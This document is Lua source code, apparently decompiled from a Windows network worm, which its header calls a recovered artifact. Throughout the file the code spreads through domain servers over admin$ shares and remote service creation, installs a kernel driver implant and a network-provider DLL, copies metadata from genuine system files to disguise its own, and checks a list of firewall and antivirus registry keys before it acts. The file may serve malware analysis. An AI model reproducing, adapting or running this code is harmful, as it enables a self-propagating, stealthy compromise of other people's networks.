-- Recovered Lua 5.0 source-equivalent artifact.
-- Generated from 50 reviewed prototype dossiers; not claimed as original source text.

local function register_core_orchestrator_functions()
  function _G.pton(ipv4_text)
    local octet_1, octet_2, octet_3, octet_4 = nil, nil, nil, nil
    _G._, _G._, octet_1, octet_2, octet_3, octet_4 = string.find(ipv4_text, '(%d+)%.(%d+)%.(%d+)%.(%d+)')
    if octet_1 == nil then return nil end
    octet_1 = tonumber(octet_1)
    octet_2 = tonumber(octet_2)
    octet_3 = tonumber(octet_3)
    octet_4 = tonumber(octet_4)
    if octet_1 > 255 or octet_2 > 255 or octet_3 > 255 or octet_4 > 255 then return nil end
    -- unreachable compiler join jump to implicit return
    return octet_1*16777216 + octet_2*65536 + octet_3*256 + octet_4
    -- implicit trailing return; unreachable after explicit returns
  end
  function _G.build_wormlet_table(wormlet_constructors)
    local active_wormlets = {}
    if wormlet_constructors == nil then return nil end
    for constructor_key, constructor_value in wormlet_constructors do  -- Lua 5.0 table-compatible generic-for
      if constructor_value ~= nil then
        active_wormlets[constructor_key] = constructor_value() end
    end; return active_wormlets
    -- implicit trailing return; unreachable
  end
  function _G.terminate(exit_status)
    if exit_status == nil then exit_status = 0 end
    unlock(global_config.lock)
    os.exit(exit_status)
    return  -- fallback only if replaceable os.exit returns
  end
  function _G.unpropagate(active_wormlets)
    for wormlet_key, wormlet in active_wormlets do  -- Lua 5.0 table-compatible generic-for
      if wormlet['unpropagate'] ~= nil then
        wormlet['unpropagate']() end
    end; return
  end
  function _G.same_subnet(target_ipv4)
    local local_interfaces = util.ghi()
    for interface_key, interface_row in local_interfaces do  -- Lua 5.0 table-compatible generic-for
      local target_network = util.And(target_ipv4, interface_row.sm)
      local interface_network = util.And(interface_row.i, interface_row.sm)
      if target_network == interface_network then
        return true end
    end; return false
    -- implicit trailing return; unreachable
  end
  function _G.target_ok(target_hostname)
    local resolved_ipv4 = util.ghbn(target_hostname, global_config.ns_timeout)
    if resolved_ipv4 == nil then return nil end
    if global_config.valid_ips == nil then return nil end
    if global_config.valid_ips.subnet and same_subnet(resolved_ipv4) then
      return true end
    for range_key, range_record in pairs(global_config.valid_ips.ip_ranges) do
      if range_record.lo <= resolved_ipv4 and resolved_ipv4 <= range_record.hi then
        return true end
    end; return false
    -- implicit trailing return; unreachable
  end
  function _G.main()
    local operation_ok = {}; local operation_status, active_wormlets = nil, nil
    process_config()
    if global_config.valid_ips then
      for range_key, range_record in global_config.valid_ips.ip_ranges do
        range_record.lo = pton(range_record.lo)
        range_record.hi = pton(range_record.hi)
        if range_record.lo == nil or range_record.hi == nil then range_record.lo, range_record.hi = 1, 0 end; end; end
    active_wormlets = build_wormlet_table(global_config.wormlets)
    if active_wormlets == nil then terminate(1) end
    if install and not ok_to_install() then terminate(0) end
    if not acquire_privilege() then
      if install then unpropagate(active_wormlets) end
      terminate(4) end
    operation_ok, operation_status = lock(global_config.lock)
    if not operation_ok then
      if install then unpropagate(active_wormlets) end
      terminate(5) end
    if install then
      local any_install_succeeded = false; operation_ok, operation_status = install_worm(global_config)
      if operation_ok then
        for install_wormlet_key, install_wormlet in active_wormlets do
          if install_wormlet.install ~= nil then
            operation_ok, operation_status = install_wormlet.install()
            if operation_ok then
              any_install_succeeded = true end
        end; end
        if not any_install_succeeded then
          if global_config.worm_install_failure_action == 'quit' then
            unpropagate(active_wormlets); terminate(7) end; end
      else if global_config.worm_install_failure_action == 'quit' then unpropagate(active_wormlets); terminate(7) end; end; end
    if not implant_installed(implant_config) then
      if not install_implant(implant_config) then
        if global_config.implant_install_failure_action == 'quit' then
          terminate(6) end; end
    end
    if install then
      local exit_after_start; operation_ok, operation_status, exit_after_start = start_worm(global_config)
      if operation_ok and not exit_after_start then
      elseif operation_ok and exit_after_start then
        terminate(0)
      else terminate(1) end; end
    if not ok_to_propagate() then terminate(0) end
    local any_init_succeeded = false
    for init_wormlet_key, init_wormlet in active_wormlets do
      if init_wormlet.init ~= nil then
        operation_ok, operation_status = init_wormlet.init()
        if not operation_ok then
          active_wormlets[init_wormlet_key] = nil
        else any_init_succeeded = true end; end; end
    if any_init_succeeded then
      util.z(global_config.initial_delay * 1000)
      while true do for propagation_wormlet_key, propagation_wormlet in active_wormlets do
        if propagation_wormlet.propagate ~= nil then
          propagation_wormlet.propagate(global_config.payload, global_config.failure_timeout) end; end
      end
    -- unreachable compiler join after the infinite propagation loop
    else terminate(8) end
    return
  end
  return
end

local function register_scm_propagation_functions()
  function _G.scm_copy_payload(source_paths, destination_directory)
    for source_key in source_paths do
      local source_path = source_paths[source_key]
      local destination_path = destination_directory .. getbase(source_path)
      local copy_success, copy_status = nt.cf(source_path, destination_path, false)
      if not copy_success then return false, copy_status end; end
    return true, nil
    -- implicit trailing return; unreachable
  end
  function _G.scm_init_prop_status()
    reset_prop_status(scm_prop_status)
    local local_unc = wstring.new([[\\]]) .. nt.gls()
    set_prop_status(scm_prop_status, local_unc, true)
    return
  end
  function _G.scm_wormlet_propagate_system(target_system, payload_files)
    if target_system == nil then return false, 0 end
    local config = scm_config; local remote_admin_share = target_system .. config.sep .. config.share; local remote_payload_directory = remote_admin_share .. config.payloaddir; local connection_created_here = false; local remote_service_command = config.svcexe .. wstring.new(' p')
    if not connected(remote_admin_share) then
      local connection_ok, connection_status = nt.mc(remote_admin_share); if not connection_ok then return false, connection_status end; connection_created_here = true end
    ok, ec = scm.is_service_installed(target_system, config.svcname); if ok == nil then
      if connection_created_here then nt.dc(remote_admin_share); return false, ec end
    elseif ok then
      if connection_created_here then
        nt.dc(remote_admin_share) end
      return nil, ec end
    if payload_files ~= nil then
      ok, ec = scm_copy_payload(payload_files, remote_payload_directory); if not ok then
        if connection_created_here then nt.dc(remote_admin_share) end; return false, ec end; end
    ok, ec = scm.create_service(target_system, config.svcname, config.svcdisplay, remote_service_command); if not ok then
      if connection_created_here then nt.dc(remote_admin_share) end; return false, ec end
    ok, ec = scm.start_service(target_system, config.svcname); if not ok then
      if connection_created_here then nt.dc(remote_admin_share) end; return false, ec end
    if connection_created_here then nt.dc(remote_admin_share) end
    return true
    -- implicit trailing return; unreachable
  end
  function _G.scm_wormlet_propagate(payload_files, failure_timeout)
    local config = scm_config; local finish_requested = false; local operation_success, operation_status, stored_target_status, observed_logged_on_user = nil, nil, nil, nil; local unbounded_timeout; local remaining_timeout = nil; if failure_timeout == 0 then unbounded_timeout = true else unbounded_timeout = false; remaining_timeout = failure_timeout end
    while not finish_requested do
    repeat observed_logged_on_user = get_logged_on_user(config.logged_on_program); if observed_logged_on_user == nil then
      util.z(config.logon_poll_rate * 1000); if not unbounded_timeout then
        remaining_timeout = remaining_timeout - config.logon_poll_rate; if remaining_timeout <= 0 then return end; end; end
    until observed_logged_on_user ~= nil
    if observed_logged_on_user ~= logged_on_user then scm_init_prop_status(); logged_on_user = observed_logged_on_user end
    operation_success, operation_status = nt.ilou(config.logged_on_program); if operation_success then
      local domain_list = nt.ed(); for domain_index, domain_name in domain_list do
        local server_list = nt.es(domain_name); for server_index, enumerated_target in server_list do
          stored_target_status = check_prop_status(scm_prop_status, enumerated_target); if stored_target_status == nil then
            if target_ok(string.sub(tostring(enumerated_target), 3)) then
              operation_success, operation_status = scm_wormlet_propagate_system(enumerated_target, payload_files); if operation_success == nil then
                set_prop_status(scm_prop_status, enumerated_target, true)
            elseif operation_success then
              set_prop_status(scm_prop_status, enumerated_target, true); util.z(config.phase_1_prop_delay * 1000)
              if not unbounded_timeout then
                remaining_timeout = failure_timeout end
              else set_prop_status(scm_prop_status, enumerated_target, false) end; end
        elseif stored_target_status then else end; end; end
      nt.rts() end; local leave_pipe_phase = false; repeat
        observed_logged_on_user = get_logged_on_user(config.logged_on_program); if logged_on_user ~= observed_logged_on_user then break end
        operation_success, operation_status = nt.ilou(config.logged_on_program)
        if operation_success then else end
        local pipe_message = nt.gcn(config.connotify_pipename, config.connotify_timeout * 1000); if pipe_message == nil then
          if unbounded_timeout then leave_pipe_phase = true
          else remaining_timeout = remaining_timeout - config.connotify_timeout; if remaining_timeout <= 0 then leave_pipe_phase = true; finish_requested = true end; end
        else local pipe_target = get_system_name(pipe_message.r); if pipe_target ~= nil then
          stored_target_status = check_prop_status(scm_prop_status, pipe_target); if stored_target_status == nil or stored_target_status == false then
            operation_success, operation_status = scm_wormlet_propagate_system(pipe_target, payload_files); if operation_success == nil then
              set_prop_status(scm_prop_status, pipe_target, true)
            elseif operation_success then
              set_prop_status(scm_prop_status, pipe_target, true)
              if not unbounded_timeout then
                remaining_timeout = failure_timeout end
            else set_prop_status(scm_prop_status, pipe_target, false) end
        end; end; end; nt.rts()
      until leave_pipe_phase; end
    return
  end
  function _G.scm_wormlet_install()
    local registry_value, operation_success = nil, nil; local operation_status = 0; local config = scm_config; local path_separator = config.sep; local expanded_dll_path_text = tostring(nt.ees(config.cndll_name)); local dll_file_handle = io.open(expanded_dll_path_text)
    if dll_file_handle == nil then
      operation_success, operation_status = tor.ill(tostring(config.cndll_internal_name), expanded_dll_path_text); if not operation_success then return true, operation_status end
    else dll_file_handle:close(); dll_file_handle = io.open(expanded_dll_path_text, 'rb')
      local payload_matches; if tor.lookup(tostring(config.cndll_internal_name)) == dll_file_handle:read('*all') then payload_matches = true else payload_matches = false end
      dll_file_handle:close(); if not payload_matches then return true, operation_status end; end
    set_metadata(config.cndll_files, config.cndll_name, config.cndll_owner)
    local network_provider_value_path = config.connotify_provider_key .. path_separator .. config.cndll_key; registry_value, operation_status = ntreg.get_value(network_provider_value_path, config.cndll_value_name); if registry_value == nil then
      operation_success, operation_status = ntreg.create_key(config.connotify_provider_key, config.cndll_key); if operation_success then
        operation_success, operation_status = ntreg.set_expand_sz_value(network_provider_value_path, config.cndll_value_name, config.cndll_name)
        if operation_success then else end; end
    else if registry_value ~= config.cndll_name then end; end
    return true, 0
    -- implicit trailing return; unreachable
  end
  function _G.scm_wormlet_init()
    logged_on_user = nil
    scm_prop_status = {}
    return true, 0
    -- implicit trailing return; unreachable
  end
  function _G.scm_wormlet()
    convert_table_to_wstring(scm_config, false)
    local interface = { install=scm_wormlet_install, init=scm_wormlet_init, propagate=scm_wormlet_propagate, name=scm_config.name }
    return interface
    -- implicit trailing return; unreachable
  end
  return
end

local function register_implant_functions()
  function _G.check_implant_reg_values(registry_descriptors)
    for descriptor_key, descriptor in registry_descriptors do
      local observed_value, ignored_status = ntreg.get_value(descriptor.key, descriptor.valname)
      if observed_value == nil then return false end
      if observed_value ~= descriptor.val then return false end; end
    return true
    -- implicit trailing return; unreachable
  end
  function _G.set_implant_reg_values(registry_descriptors)
    local operation_success, operation_status = true, nil; local reg_sz_type=wstring.new('REG_SZ'); local reg_expand_sz_type=wstring.new('REG_EXPAND_SZ'); local reg_dword_type=wstring.new('REG_DWORD')
    for descriptor_index, descriptor in registry_descriptors do
      operation_success, operation_status = create_key_complete(descriptor.key); if not operation_success then return false, operation_status end
      if descriptor.type == reg_sz_type then operation_success, operation_status = ntreg.set_sz_value(descriptor.key, descriptor.valname, descriptor.val)
      elseif descriptor.type == reg_expand_sz_type then operation_success, operation_status = ntreg.set_expand_sz_value(descriptor.key, descriptor.valname, descriptor.val)
      elseif descriptor.type == reg_dword_type then operation_success, operation_status = ntreg.set_dword_value(descriptor.key, descriptor.valname, descriptor.val)
      else return false, operation_status end
      if not operation_success then return false, operation_status end; end
    return true, 0
    -- implicit trailing return; unreachable
  end
  function _G.install_implant(config)
    local success, operation_status = true, nil; local expanded_path = nt.ees(config.implant_file)
    local file_handle = io.open(tostring(expanded_path)); if file_handle == nil then
      success, operation_status = tor.ill(tostring(config.implant_internal_name), tostring(expanded_path))
      if not success then return false end
      set_metadata(config.implant_files, expanded_path, config.implant_owner)
    else file_handle:close() end
    if not check_implant_reg_values(config.implant_regvalues) then
      success, operation_status = set_implant_reg_values(config.implant_regvalues)
      if success then else end; end
    return success
    -- implicit trailing return; unreachable
  end
  function _G.implant_installed(config)
    local file_handle = io.open(tostring(config.implant_file))
    local installed = true
    if file_handle == nil then installed = false else
      if not check_implant_reg_values(config.implant_regvalues) then installed = false end
      file_handle:close() end
    return installed
    -- implicit trailing return; unreachable
  end
  return
end

local function register_propagation_status_functions()
  function _G.reset_prop_status(status_table)
    if status_table == nil then return end
    for status_key in status_table do
      status_table[status_key] = nil; end
    return
  end
  function _G.check_prop_status(status_table, target)
    if status_table == nil or target == nil then return nil end
    if type(target) == 'userdata' then target = tostring(target) end
    target = string.lower(target)
    for candidate_key, candidate_status in status_table do
      if candidate_key == target then return candidate_status end; end
    return nil
    -- implicit trailing return; unreachable
  end
  function _G.set_prop_status(status_table, target, status)
    if status_table == nil or target == nil then return end
    if type(target) == 'userdata' then target = tostring(target) end
    target = string.lower(target)
    status_table[target] = status
    return
  end
  return
end

local function register_common_runtime_functions()
  function _G.lock(mutex_name)
    return util.ll(mutex_name)
    -- implicit trailing return; unreachable
  end
  function _G.unlock(ignored_lock_value)
    return util.ul()  -- ignored_lock_value is not consumed
    -- implicit trailing return; unreachable
  end
  function _G.acquire_privilege()
    return true
    -- implicit trailing return; unreachable
  end
  function _G.convert_table_to_wstring(value_table, expand_environment)
    if type(value_table) ~= 'table' then return end
    for entry_key, entry_value in value_table do
      if type(entry_value) == 'string' then
        if expand_environment then value_table[entry_key] = nt.ees(wstring.new(entry_value))
        else value_table[entry_key] = wstring.new(entry_value) end; end
      if type(entry_value) == 'table' then
        convert_table_to_wstring(entry_value, expand_environment) end; end
    return
  end
  function _G.prune(path)
    local scan_index = wstring.len(path)
    while scan_index >= 1 do
      local code_unit = wstring.byte(path, scan_index)
      if code_unit == 92 then
        return wstring.sub(path, 1, scan_index - 1) end
      -- branch joins the loop latch
      scan_index = scan_index - 1
    end; return nil
    -- implicit trailing return; unreachable
  end
  function _G.getbase(path)
    local scan_index = wstring.len(path)
    while scan_index >= 1 do
      local code_unit = wstring.byte(path, scan_index)
      if code_unit == 92 then
        return wstring.sub(path, scan_index + 1, wstring.len(path)) end
      -- branch joins the loop latch
      scan_index = scan_index - 1
    end; return path
    -- implicit trailing return; unreachable
  end
  function _G.set_metadata(donor_files, destination_path, owner_name)
    local owner_ok, owner_status, donor_file_handle, selected_donor_path = nil, nil, nil, nil
    local expanded_destination_path = nt.ees(destination_path)
    owner_ok, owner_status = nt.co(expanded_destination_path, owner_name)
    if owner_ok then else end
    for donor_index in donor_files do
      donor_file_handle = io.open(tostring(nt.ees(donor_files[donor_index])), 'r')
      if donor_file_handle ~= nil then
        selected_donor_path = nt.ees(donor_files[donor_index])
        break end
    end; if donor_file_handle == nil then
      return end
    donor_file_handle:close()
    owner_ok, owner_status = nt.cd(selected_donor_path, expanded_destination_path)
    if owner_ok then else end
    owner_ok, owner_status = nt.ca(selected_donor_path, expanded_destination_path)
    if owner_ok then else end
    owner_ok, owner_status = nt.ct(selected_donor_path, expanded_destination_path)
    if owner_ok then else end
    return
  end
  function _G.create_key_complete(full_registry_path)
    local parent_exists = false; local candidate_parent_path = wstring.new(wstring.tostring(full_registry_path))
    while candidate_parent_path ~= nil and not parent_exists do
      ok, ec = ntreg.check_key(candidate_parent_path)
      if ok then
        parent_exists = true
      elseif ec == 2 then
        candidate_parent_path = prune(candidate_parent_path)
      else return false, ec end
    end; if candidate_parent_path == full_registry_path then return true, 0 end
    if candidate_parent_path == nil then return false, 2 end
    subkey = wstring.sub(full_registry_path, wstring.len(candidate_parent_path) + 2)
    return ntreg.create_key(candidate_parent_path, subkey)
    -- implicit trailing return; unreachable
  end
  function _G.connected(remote_name)
    local connected_resources, resource_count = nt.ecc()
    for resource_key, resource in connected_resources do
      if wstring.lower(resource.r) == wstring.lower(remote_name) then
        return true end
    end; return false
    -- implicit trailing return; unreachable
  end
  function _G.get_logged_on_user(process_name)
    local account_name, domain_name = nt.glou(process_name)
    if account_name == nil then
      else account_name = domain_name .. wstring.new([[\]]) .. account_name end
    return account_name
    -- implicit trailing return; unreachable
  end
  function _G.get_local_system()
    local unc_name = wstring.new([[\\]]) .. nt.gls()
    return unc_name
    -- implicit trailing return; unreachable
  end
  function _G.get_system_name(remote_path)
    if remote_path == nil then return nil end
    if wstring.sub(remote_path, 1, 2) ~= wstring.new([[\\]]) then
      return nil end
    local server_tail = wstring.sub(remote_path, 3); local separator_index = wstring.str(server_tail, wstring.new([[\]]))
    if separator_index == 0 then return remote_path end
    return wstring.sub(remote_path, 1, separator_index + 1)
    -- implicit trailing return; unreachable
  end
  function _G.process_config()
    local saved_implant_action, saved_worm_action, saved_valid_ips = global_config.implant_install_failure_action, global_config.worm_install_failure_action, global_config.valid_ips; global_config.valid_ips = nil
    convert_table_to_wstring(global_config, true)
    global_config.implant_install_failure_action=saved_implant_action; global_config.worm_install_failure_action=saved_worm_action; global_config.valid_ips=saved_valid_ips
    convert_table_to_wstring(implant_config, true)
    return
  end
  function _G.install_worm(config)
    local matched_service, service_operation_success = nil, nil; local service_operation_status = 0; local local_system_name = get_local_system()
    set_metadata(config.exe_files, config.exe, config.exe_owner)
    matched_service = nt.ps(config.ntsvcs, config.xp2ksvcs, config.forbidden_svcexes, config.exe)
    if matched_service == nil then
      if is_service then
        service_operation_success, service_operation_status = scm.set_exepath(local_system_name, config.svcname, config.exe)
        if service_operation_success then else end
      else service_operation_success, service_operation_status = scm.create_service(local_system_name, config.svcname, config.svcdisplay, config.exe)
        if not service_operation_success then
          return false, service_operation_status end; end
      if config.svcdesc ~= nil then
        service_operation_success, service_operation_status = ntreg.set_sz_value(config.svckey, config.svcdescval, config.svcdesc)
        if service_operation_success then else end; end
      config.debugger = false
    else config.debugger = true end
    return true, service_operation_status
    -- implicit trailing return; unreachable
  end
  function _G.start_worm(config)
    local local_system_name = get_local_system(); local debugger_cleanup_succeeded = nil; local service_operation_status = 0; local startup_ok, exit_installer = true, true
    if config.debugger then
      if unlock() then else end
      if is_service then
        debugger_cleanup_succeeded, service_operation_status = scm.delete_service(local_system_name, config.svcname)
        if debugger_cleanup_succeeded then
          debugger_cleanup_succeeded, service_operation_status = scm.stop_service(local_system_name, config.svcname)
          if debugger_cleanup_succeeded then else end; end; end
    else if is_service then
        exit_installer = false
      elseif unlock() then
        local normal_start_succeeded; normal_start_succeeded, service_operation_status = scm.start_service(local_system_name, config.svcname)
        if not normal_start_succeeded then
          startup_ok = false end
      else startup_ok = false end; end
    return startup_ok, service_operation_status, exit_installer
    -- implicit trailing return; unreachable
  end
  function _G.key_and_value(registry_path)
    local separator_index = string.find(registry_path, [[\[^\]*$]])
    if separator_index == nil then
      return registry_path, '' end
    local key_path = string.sub(registry_path, 1, separator_index - 1)
    return key_path, string.sub(registry_path, separator_index + 1)
    -- implicit trailing return; unreachable
  end
  function _G.ok_to_install()
    return ok_to_propagate()
    -- implicit trailing return; unreachable
  end
  function _G.ok_to_propagate()
    local key_path, registry_value, registry_status = nil, nil, nil
    if global_config.no_firewall_check then
      return true end
    for marker_index, registry_marker in global_config.forbidden_keys do
      local marker_openable_with_full_access = ntreg.check_key(registry_marker)
      if marker_openable_with_full_access then
        return false end
      local key_text, value_text = key_and_value(tostring(registry_marker))
      key_path = wstring.new(key_text)
      local value_name = wstring.new(value_text)
      registry_value, registry_status = ntreg.get_value(key_path, value_name)
      if registry_value ~= nil or registry_status == 13 then
        return false end
    end; return true
    -- implicit trailing return; unreachable
  end
  return
end

local function initialize_debug_config()
  debug_config = {}
  return
end

local function initialize_global_config()
  local cfg = { traceon=false, lock='NtfsMetaDataMutex', initial_delay=120, failure_timeout=0 }
  cfg.payload = {[[%windir%\system32\svcmgmt.exe]]}; cfg.wormlets = {scm_wormlet}
  cfg.svcname='SvcMgmt'; cfg.svcdisplay='Service Management'; cfg.svcdesc='Provides service management capability'; cfg.svckey=[[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\SvcMgmt]]; cfg.svcdescval='Description'; cfg.ntsvcs={}; cfg.xp2ksvcs={}; cfg.debugger=nil
  cfg.forbidden_svcexes={'services.exe','services','svchost.exe','svchost'}; cfg.exe=[[%windir%\system32\svcmgmt.exe]]; cfg.exe_owner='Administrators'; cfg.exe_files={[[%windir%\system32\services.exe]]}; cfg.implant_install_failure_action='go'; cfg.worm_install_failure_action='go'
  cfg.valid_ips = { subnet=true, ip_ranges={{lo='10.0.0.0',hi='10.255.255.255'},{lo='172.16.0.0',hi='172.31.255.255'},{lo='192.168.0.0',hi='192.168.255.255'}} }
  cfg.forbidden_keys = { [1]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\InstalledApps]], [2]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Sygate Technologies, Inc.\Sygate Personal Firewall]], [3]=[[HKEY_LOCAL_MACHINE\SOFTWARE\TrendMicro\PFW]], [4]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Zone Labs\TrueVector]], [5]=[[HKEY_LOCAL_MACHINE\SOFTWARE\F-Secure]], [6]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Network Ice\BlackIce]], [7]=[[HKEY_LOCAL_MACHINE\SOFTWARE\McAfee.com\Personal Firewall]], [8]=[[HKEY_LOCAL_MACHINE\SOFTWARE\ComputerAssociates\eTrust EZ Armor]], [9]=[[HKEY_LOCAL_MACHINE\SOFTWARE\RedCannon\Fireball]], [10]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Kerio\Personal Firewall 4]], [11]=[[HKEY_LOCAL_MACHINE\SOFTWARE\KasperskyLab\InstalledProducts\Kaspersky Anti-Hacker]], [12]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Tiny Software\Tiny Firewall]], [13]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Look 'n' Stop 2.05p2]], [14]=[[HKEY_CURRENT_USER\SOFTWARE\Soft4Ever]], [15]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Norman Data Defense Systems]], [16]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Agnitum\Outpost Firewall]], [17]=[[HKEY_LOCAL_MACHINE\SOFTWARE\Panda Software\Firewall]], [18]=[[HKEY_LOCAL_MACHINE\SOFTWARE\InfoTeCS\TermiNET]] }
  global_config = cfg
  return
end

local function initialize_implant_config()
  local cfg = { implant_internal_name='win32implant', implant_file=[[%windir%\system32\drivers\fast16.sys]], implant_svcname='fast16', implant_owner='Administrators', implant_files={[[%windir%\system32\drivers\beep.sys]]} }
  cfg.implant_regvalues = { {key=[[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\fast16]],valname='Start',type='REG_DWORD',val=0}, {key=[[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\fast16]],valname='Type',type='REG_DWORD',val=2}, {key=[[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\fast16]],valname='ErrorControl',type='REG_DWORD',val=1}, {key=[[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\fast16]],valname='Group',type='REG_SZ',val='SCSI class'} }
  implant_config = cfg
  return
end

local function initialize_scm_config()
  local cfg = { name='scm', connotify_pipename=[[\\.\pipe\p577]], connotify_timeout=133, connotify_provider_key=[[HKEY_LOCAL_MACHINE\system\CurrentControlSet\Control\NetworkProvider]], cndll_key='Notifyees', cndll_value_name='svcmgmt', cndll_name=[[%windir%\system32\svcmgmt.dll]], cndll_internal_name='connotifydll', cndll_owner='Administrators', cndll_files={[[%windir%\system32\mpr.dll]]}, share='admin$', payloaddir=[[\system32\]], sep=[[\]] }
  cfg.svcname=global_config.svcname; cfg.svcdisplay=global_config.svcdisplay; cfg.svcdesc=global_config.svcdesc; cfg.svckey=global_config.svckey; cfg.svcdescval=global_config.svcdescval; cfg.svcexe=global_config.exe
  cfg.logon_poll_rate=67; cfg.phase_1_prop_delay=20; cfg.logged_on_program='explorer.exe'
  scm_config = cfg
  return
end

local function invoke_main_with_xpcall()
  local protected_call_succeeded, protected_call_result = xpcall(main, debug.traceback)
  return  -- intentionally discard both xpcall results
end

register_core_orchestrator_functions()  -- closure 0.0
register_scm_propagation_functions()  -- closure 0.1
register_implant_functions()  -- closure 0.2
register_propagation_status_functions()  -- closure 0.3
register_common_runtime_functions()  -- closure 0.4
initialize_debug_config()  -- closure 0.5
initialize_global_config()  -- closure 0.6
initialize_implant_config()  -- closure 0.7
initialize_scm_config()  -- closure 0.8
invoke_main_with_xpcall()  -- closure 0.9; runs only after all initializers
return
